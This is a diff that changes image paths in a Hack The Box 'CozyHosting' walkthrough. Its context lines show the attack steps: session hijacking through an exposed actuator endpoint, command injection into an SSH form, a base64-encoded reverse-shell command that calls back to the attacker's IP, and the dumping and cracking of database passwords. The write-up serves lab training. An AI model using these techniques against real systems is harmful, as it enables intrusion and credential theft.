@@ -16,7 +16,7 @@ Scanning the HTB machine with Nmap tool
 sudo nmap -sC -sV -sS 10.10.11.230
 ```
 
-![](Pasted%20image%2020260820071953.png)
+![](/assets/img/posts/pasted-image-20260820071953-png.svg)
 
 We will see a redirect made on port 80, so add this host to `/etc/hosts`
 ```
@@ -28,28 +28,28 @@ Visiting this page, it becomes clear that there is nothing captivating apart fro
 dirsearch -u http://cozyhosting.htb
 ```
 
-![[Pasted image 20250816234657.png]]
+![[Pasted image /assets/img/posts/20250816234657-png.svg]]
 
 During this directory fuzzing, we found a directory: `/actuator/sessions` , so lets visit it: http://cozyhosting.htb/actuator/sessions
 
-![[Pasted image 20250816234707.png]]
+![[Pasted image /assets/img/posts/20250816234707-png.svg]]
 
  It contains JESSIONIDs of the users
  
 So we will try to to logged in by replacing our JESSIONID with this JESSIONIDs
 
-![[Pasted image 20250816234737.png]]
+![[Pasted image /assets/img/posts/20250816234737-png.svg]]
 
 We successfully logged in !
  
 Now, on this dashboard we found that there was a functionality running which serves an SSH connection to it's users.
 
-![[Pasted image 20250816234745.png]]
+![[Pasted image /assets/img/posts/20250816234745-png.svg]]
 
  
 The SSH connection settings form at the bottom of the admin page is interesting. Entering the attacker's IP address and a username, burp reveals a POST is sent to `/executessh`
 
-![[Pasted image 20250816234753.png]]
+![[Pasted image /assets/img/posts/20250816234753-png.svg]]
 
 This just seems to timeout and no connection is established with the attacker's IP
 
@@ -58,11 +58,11 @@ Trying different things:
 
 Can it be that simple? Command injection may be the way into the target.
 
-![[Pasted image 20250816234809.png]]
+![[Pasted image /assets/img/posts/20250816234809-png.svg]]
 
 After that, we tried to send the username with single quote `test'`
 
-![[Pasted image 20250816234817.png]]
+![[Pasted image /assets/img/posts/20250816234817-png.svg]]
 
  Its shows that there was an error created during the `/bin/bash -c`  execution process.
 
@@ -73,7 +73,7 @@ echo "bash -i >& /dev/tcp/10.10.16.10/9001 0>&1" | base64 -w 0         
 
 Then URL encode it, and it will looks like: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMC85MDAxIDA+JjEK`
 
-![[Pasted image 20250816234825.png]]
+![[Pasted image /assets/img/posts/20250816234825-png.svg]]
 
 
 First, start a listener on our machine.
@@ -98,7 +98,7 @@ app@cozyhosting:/app$ ctrl + z
 app@cozyhosting:/app$ stty raw -echo; fg
 ```
 
-![[Pasted image 20250816234833.png]]
+![[Pasted image /assets/img/posts/20250816234833-png.svg]]
 
 We found `cloudhosting-0.0.1.jar` file, lets take it to our machine
 
@@ -117,7 +117,7 @@ We opened this file using `jd-gui` , and got the PostgreSQL database's username:
 jd-gui cloudhosting-0.0.1.jar
 ```
 
-![[Pasted image 20250816234841.png]]
+![[Pasted image /assets/img/posts/20250816234841-png.svg]]
 
 We successfully logged into the PostgreSQL database using these username and password.
 ```
@@ -129,7 +129,7 @@ postgres=# d
 postgres=# select * from users;
 ```
 
-![](Pasted%20image%2020260820074216.png)
+![](/assets/img/posts/pasted-image-20260820074216-png.svg)
 
 We cracked this password using john tool
 ```
